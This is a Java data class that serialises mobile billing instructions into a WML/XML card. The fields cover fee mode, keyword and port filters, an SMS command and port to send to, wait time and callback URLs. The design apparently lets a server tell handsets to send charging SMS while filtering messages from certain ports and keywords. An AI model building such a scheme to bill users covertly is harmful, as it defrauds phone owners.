package net.mimiduo.boot.pojo.data;

import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.output.XMLOutputter;

public class SendWapXml {
    /** 计费模块 为：40 **/
    private String feemode;

    /** 对关键字过滤 **/
    private String filter1Cust;

    /** 屏蔽端口 **/
    private String portShield;

    /** 客户端是否有下一步动作 **/
    private int hasNext;

    /** 是否需要同步数据给服务器 **/
    private int hasSync;

    /** 终端操作类型1联网 2发送短信 **/
    private int nextOptType;

    /** 延迟时间 **/
    private int waitTime;

    /** 客户端上传数据地址 **/
    private String WAPAPIUrl;

    /** 客户端要访问的地址 **/
    private String ListUrl;

    /** 访问方式1为post 2位get **/
    private String SendType;

    /** 短信指令 NextOptType == 2 **/
    private String cmd;

    /** 短信端口 **/
    private String addr;

    public String getFeemode() {
        return feemode;
    }

    public void setFeemode(String feemode) {
        this.feemode = feemode;
    }

    public String getFilter1Cust() {
        return filter1Cust;
    }

    public void setFilter1Cust(String filter1Cust) {
        this.filter1Cust = filter1Cust;
    }

    public String getPortShield() {
        return portShield;
    }

    public void setPortShield(String portShield) {
        this.portShield = portShield;
    }

    public int getHasNext() {
        return hasNext;
    }

    public void setHasNext(int hasNext) {
        this.hasNext = hasNext;
    }

    public int getHasSync() {
        return hasSync;
    }

    public void setHasSync(int hasSync) {
        this.hasSync = hasSync;
    }

    public int getNextOptType() {
        return nextOptType;
    }

    public void setNextOptType(int nextOptType) {
        this.nextOptType = nextOptType;
    }

    public int getWaitTime() {
        return waitTime;
    }

    public void setWaitTime(int waitTime) {
        this.waitTime = waitTime;
    }

    public String getWAPAPIUrl() {
        return WAPAPIUrl;
    }

    public void setWAPAPIUrl(String wAPAPIUrl) {
        WAPAPIUrl = wAPAPIUrl;
    }

    public String getListUrl() {
        return ListUrl;
    }

    public void setListUrl(String listUrl) {
        ListUrl = listUrl;
    }

    public String getSendType() {
        return SendType;
    }

    public void setSendType(String sendType) {
        SendType = sendType;
    }

    public String getCmd() {
        return cmd;
    }

    public void setCmd(String cmd) {
        this.cmd = cmd;
    }

    public String getAddr() {
        return addr;
    }

    public void setAddr(String addr) {
        this.addr = addr;
    }

    @Override
    public String toString() {
        Element root = new Element("wml");
        Document Doc = new Document(root);

        Element card = new Element("card");
        root.addContent(card);

        Element feemode = new Element("feemode");
        feemode.setText(this.feemode);
        card.addContent(feemode);

        Element filter1_addr = new Element("Filter_Key");
        filter1_addr.setText(this.filter1Cust);
        card.addContent(filter1_addr);

        Element port_shield = new Element("Filter_Addr");
        port_shield.setText(this.portShield);
        card.addContent(port_shield);

        Element has_next = new Element("HasNext");
        has_next.setText(String.valueOf(this.hasNext));
        card.addContent(has_next);

        Element has_sync = new Element("NextSync");
        has_sync.setText(String.valueOf(this.hasSync));
        card.addContent(has_sync);

        Element next_opttype = new Element("NextOptType");
        next_opttype.setText(String.valueOf(this.nextOptType));
        card.addContent(next_opttype);

        Element wait_time = new Element("WaitTime");
        wait_time.setText(String.valueOf(this.waitTime));
        card.addContent(wait_time);

        Element wap_appi_url = new Element("WAPAPIUrl");
        wap_appi_url.setText(this.WAPAPIUrl);
        card.addContent(wap_appi_url);

        Element list_url = new Element("ListUrl");
        list_url.setText(this.ListUrl);
        card.addContent(list_url);

        Element send_type = new Element("SendType");
        send_type.setText(this.SendType);
        card.addContent(send_type);

        Element cmd = new Element("Cmd");
        cmd.setText(this.cmd);
        card.addContent(cmd);

        Element Addr = new Element("Addr");
        Addr.setText(this.addr);
        card.addContent(Addr);

        XMLOutputter XMLOut = new XMLOutputter();
        String str = XMLOut.outputString(Doc);

        return str;
    }
}
